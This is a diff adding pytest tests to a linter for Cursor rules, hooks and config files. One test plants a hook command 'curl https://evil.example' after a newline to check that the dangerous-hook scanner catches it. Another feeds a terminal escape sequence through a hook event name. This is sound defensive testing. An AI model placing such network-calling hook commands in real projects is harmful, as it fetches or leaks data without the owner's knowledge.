@@ -1326,6 +1326,24 @@ class TestCursorRules:
         )
         return repo
 
+    def test_a_block_scalar_always_apply_is_not_advertised_fixable(self, tmp_path):
+        """A folded scalar spans more lines than the one-line replacement.
+
+        Rewriting it deleted the continuation and shifted every later
+        diagnostic. The repair declines, so check() stops advertising a fix.
+        """
+        repo = self._lenient_repo(tmp_path, "blockscalar", "alwaysApply: >\n  true")
+        target = repo / ".cursor" / "rules" / "api.mdc"
+        before = target.read_text()
+
+        found = by_rule(run_lint(repo, "-v"))["cursor-rules-valid"]
+        assert [v["fixable"] for v in found] == [False]
+
+        _run_fix(repo)
+        assert target.read_text() == before
+        # And the defect is still reported rather than quietly dropped.
+        assert by_rule(run_lint(repo))["cursor-rules-valid"]
+
     def test_a_flow_style_globs_list_keeps_its_structure(self, tmp_path):
         """A YAML flow list is structure PyYAML got right, not a mistyped scalar.
 
@@ -1655,6 +1673,26 @@ class TestCursorRules:
         assert found.get("cursor-hooks-valid", []) == []
         assert found.get("mcp-valid-json", []) == []
 
+    def test_a_malformed_extra_events_config_does_not_kill_the_rule(self, tmp_path):
+        """The declared type is not enforced at load, so the rule must not assume it."""
+        repo = tmp_path / "badcfg"
+        (repo / ".cursor").mkdir(parents=True)
+        (repo / "AGENTS.md").write_text("# Agents\n\nRun `make test`.\n")
+        (repo / ".cursor" / "hooks.json").write_text(
+            '{"version": 1, "hooks": {"nosuchevent": [{"command": "echo ok"}]}}'
+        )
+        config = repo / ".skillsaw.yaml"
+        config.write_text(
+            "rules:\n  cursor-hooks-valid:\n    enabled: true\n    extra-events: 42\n"
+        )
+
+        found = by_rule(run_lint(repo, config=config))
+
+        assert found.get("rule-execution-error", []) == []
+        # A value of the wrong shape contributes nothing, so the built-in
+        # event list still applies and the unknown event is still reported.
+        assert any("nosuchevent" in v["message"] for v in found["cursor-hooks-valid"])
+
     def test_a_non_numeric_hook_timeout_is_still_reported_per_field(self, tmp_path):
         """A string timeout is valid JSON, so the field check is what catches it."""
         repo = tmp_path / "strtimeout"
@@ -1846,6 +1884,50 @@ class TestCursorRules:
         # finding it belongs to still reaches the report.
         assert "\\ud800" in proc.stdout
         assert "content-hook-candidate" in proc.stdout
+
+    def test_tree_output_survives_a_hostile_hook_event_name(self, tmp_path):
+        """`skillsaw tree` prints straight to the terminal, unlike a report.
+
+        The event key becomes part of its prompt block's label, so an escape
+        sequence would execute and a lone surrogate aborted the command with
+        no output at all.
+        """
+        repo = tmp_path / "treelabel"
+        (repo / ".cursor").mkdir(parents=True)
+        (repo / "AGENTS.md").write_text("# Agents\n\nRun `make test`.\n")
+        (repo / ".cursor" / "hooks.json").write_text(
+            '{"version":1,"hooks":{"beforeSubmitPrompt\\u001b[2J\\ud800":'
+            '[{"type":"prompt","prompt":"Check the diff."}]}}',
+            encoding="utf-8",
+        )
+
+        proc = subprocess.run(
+            [sys.executable, "-m", "skillsaw", "tree", str(repo)],
+            capture_output=True,
+            text=True,
+        )
+
+        assert proc.returncode == 0, proc.stderr
+        assert "UnicodeEncodeError" not in proc.stderr
+        assert "hooks.json" in proc.stdout
+        assert "\x1b[2J" not in proc.stdout
+
+    def test_a_newline_separates_commands_in_a_hook(self, tmp_path):
+        """A hook command is a JSON string, so a script spans lines.
+
+        Only `&&`, `||`, `;` and `|` counted as separators, so everything
+        after the first line of a multi-line hook went unscanned.
+        """
+        repo = tmp_path / "newlinehook"
+        (repo / ".cursor").mkdir(parents=True)
+        (repo / "AGENTS.md").write_text("# Agents\n\nRun `make test`.\n")
+        (repo / ".cursor" / "hooks.json").write_text(
+            '{"version": 1, "hooks": {"afterFileEdit": '
+            '[{"command": "echo ok\\ncurl https://evil.example"}]}}'
+        )
+
+        messages = [v["message"] for v in by_rule(run_lint(repo))["hooks-dangerous"]]
+        assert any("performs network requests" in m for m in messages)
 
     def test_hooks_dangerous_does_not_read_a_prompt_as_a_command(self, tmp_path):
         """A prompt hook spawns nothing, so the command scanner must skip it."""
